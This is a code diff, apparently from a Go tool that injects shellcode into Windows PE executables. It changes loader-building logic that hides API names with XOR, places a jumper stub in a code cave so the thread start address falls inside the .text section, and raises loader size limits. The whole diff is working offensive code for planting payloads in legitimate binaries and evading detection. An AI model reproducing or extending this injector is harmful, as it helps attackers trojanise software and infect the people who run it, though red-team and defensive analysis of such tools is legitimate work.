@@ -23,8 +23,8 @@ var _ embed.FS
 const numInstForCopyShellcode = 4
 
 const (
-	maxNumLoaderInstX86 = 300
-	maxNumLoaderInstX64 = 250
+	maxNumLoaderInstX86 = 350
+	maxNumLoaderInstX64 = 300
 )
 
 const reservedLoaderSize = 4096
@@ -89,9 +89,12 @@ type loaderCtx struct {
 	LackCreateThread        bool
 	LackWaitForSingleObject bool
 	LoadLibraryWOnly        bool
-	NeedCreateThread        bool
-	NeedWaitThread          bool
-	NeedEraseShellcode      bool
+
+	// store options status
+	NeedCreateThread   bool
+	NeedWaitThread     bool
+	NeedEraseShellcode bool
+	NeedJumper         bool
 
 	// encrypt procedure name with xor
 	Kernel32DLLDB          []int64
@@ -120,6 +123,7 @@ type loaderCtx struct {
 	CodeCave        bool
 	ExtendSection   bool
 	CreateSection   bool
+	JumperOffset    uint32
 	EntryOffset     int
 	MemRegionSize   int
 	ShellcodeOffset uint32
@@ -187,6 +191,10 @@ func (inj *Injector) buildLoaderASM(src string, shellcode []byte, ins bool) (str
 		EndOfLoader: endOfShellcode,
 	}
 	err := inj.findProcFromIAT(ctx)
+	if err != nil {
+		return "", err
+	}
+	err = inj.tryWriteJumper(ctx)
 	if err != nil {
 		return "", err
 	}
@@ -457,9 +465,9 @@ func (inj *Injector) encryptString(str string, isUTF16 bool) ([]int64, []int64) 
 	return val, key
 }
 
-// buildJumper is used to try to find a code cave for store instructions about
+// tryWriteJumper is used to try to find a code cave for store instructions about
 // a jumper to the shellcode, that the thread start address is in .text section.
-func (inj *Injector) buildJumper(ctx *loaderCtx) error {
+func (inj *Injector) tryWriteJumper(ctx *loaderCtx) error {
 	if len(inj.caves) == 0 || inj.opts.NotCreateThread {
 		return nil
 	}
@@ -467,16 +475,18 @@ func (inj *Injector) buildJumper(ctx *loaderCtx) error {
 	switch inj.arch {
 	case "386":
 		src = `
+            .code32
             // read thread argument that stored the shellcode address
             mov {{.Reg.eax}}, [esp+4]
             call {{.Reg.eax}}
-            ret       `
+            ret                       `
 	case "amd64":
 		src = `
+            .code64
             // read thread argument that stored the shellcode address
             mov {{.Reg.rax}}, rcx
             call {{.Reg.rax}}
-            ret       `
+            ret                   `
 	}
 	type jumperCtx struct {
 		Reg map[string]string
@@ -500,6 +510,9 @@ func (inj *Injector) buildJumper(ctx *loaderCtx) error {
 	}
 	cave := inj.selectCodeCave()
 	cave.Write(inj.dup, inst)
+	// update loader context
+	ctx.NeedJumper = true
+	ctx.JumperOffset = cave.virtualAddr
 	return nil
 }
 
